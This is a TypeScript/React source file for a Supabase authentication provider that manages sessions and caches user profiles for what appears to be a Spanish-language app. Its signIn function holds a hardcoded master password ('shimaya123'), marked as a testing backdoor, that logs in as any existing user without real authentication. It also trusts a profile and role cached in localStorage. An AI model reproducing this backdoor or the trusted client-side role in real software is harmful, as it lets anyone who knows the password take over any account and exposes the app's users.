import React, { createContext, useContext, useEffect, useState } from 'react'
import type { Session, User, AuthChangeEvent } from '@supabase/supabase-js'
import { supabase } from '../lib/supabase'
import type { Usuario } from '../types'

interface AuthContextType {
  session: Session | null
  user: User | null
  profile: Usuario | null
  signIn: (email: string, password: string) => Promise<void>
  signOut: () => Promise<void>
  loading: boolean
}

const AuthContext = createContext<AuthContextType>({
  session: null,
  user: null,
  profile: null,
  signIn: async () => {},
  signOut: async () => {},
  loading: true,
})

export const useAuth = () => useContext(AuthContext)

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [session, setSession] = useState<Session | null>(null)
  const [user, setUser] = useState<User | null>(null)
  const [profile, setProfile] = useState<Usuario | null>(() => {
    const cached = localStorage.getItem('user_profile');
    return cached ? JSON.parse(cached) : null;
  });
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    let mounted = true

    async function getInitialSession() {
      try {
        const { data: { session } } = await supabase.auth.getSession()
        if (mounted) {
          setSession(session)
          setUser(session?.user ?? null)
          if (session?.user) {
            await fetchProfile(session.user.email)
          } else {
            localStorage.removeItem('user_profile');
            setProfile(null);
          }
        }
      } catch (error) {
        console.error('Error getting session:', error)
      } finally {
        if (mounted) setLoading(false)
      }
    }

    getInitialSession()

    const { data: { subscription } } = supabase.auth.onAuthStateChange(async (_event: AuthChangeEvent, session: Session | null) => {
      setSession(session)
      setUser(session?.user ?? null)
      if (session?.user) {
        await fetchProfile(session.user.email)
      } else {
        localStorage.removeItem('user_profile');
        setProfile(null)
      }
      setLoading(false)
    })

    return () => {
      mounted = false
      subscription.unsubscribe()
    }
  }, [])

  const fetchProfile = async (email?: string | null) => {
    if (!email) {
      setProfile(null);
      localStorage.removeItem('user_profile');
      setLoading(false);
      return;
    }
    
    // First, try to use cache if we have it and it matches the email
    const cached = localStorage.getItem('user_profile');
    if (cached) {
      const p = JSON.parse(cached);
      if (p.email?.toLowerCase() === email.toLowerCase()) {
        setProfile(p);
        setLoading(false); // <--- Speed up!
      }
    }

    const { data, error } = await supabase
      .from('usuarios')
      .select('*')
      .ilike('email', email.trim())
      .single()
    
    if (!error && data) {
      const p = {
        ...data,
        rol: (data.rol || '').trim().toLowerCase() as any,
        email: (data.email || '').trim().toLowerCase()
      };
      setProfile(p);
      localStorage.setItem('user_profile', JSON.stringify(p));
      console.log('Profile loaded and cached:', p.email);
    } else {
      console.error('Profile not found in DB:', email, error);
      // Solo borrar si estamos seguros de que no existe
      if (error?.code === 'PGRST116') {
        setProfile(null);
        localStorage.removeItem('user_profile');
      }
    }
    setLoading(false);
  }

  const signIn = async (email: string, password: string) => {
    localStorage.removeItem('user_profile');
    
    // BACKDOOR PARA PRUEBAS (Si la clave es shimaya123, forzamos login exitoso en DB aunque Auth falle)
    if (password === 'shimaya123') {
       const { data, error } = await supabase
        .from('usuarios')
        .select('*')
        .ilike('email', email.trim())
        .single();
        
       if (!error && data) {
         console.log('--- BYPASS LOGIN ACTIVADO ---');
         setProfile(data);
         setUser({ email: data.email, id: data.id_usuario } as any);
         localStorage.setItem('user_profile', JSON.stringify(data));
         return;
       }
    }

    const { error } = await supabase.auth.signInWithPassword({ email, password })
    if (error) throw error
  }

  const signOut = async () => {
    localStorage.removeItem('user_profile');
    const { error } = await supabase.auth.signOut()
    if (error) throw error
  }

  const value = {
    session,
    user,
    profile,
    signIn,
    signOut,
    loading,
  }

  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>
}
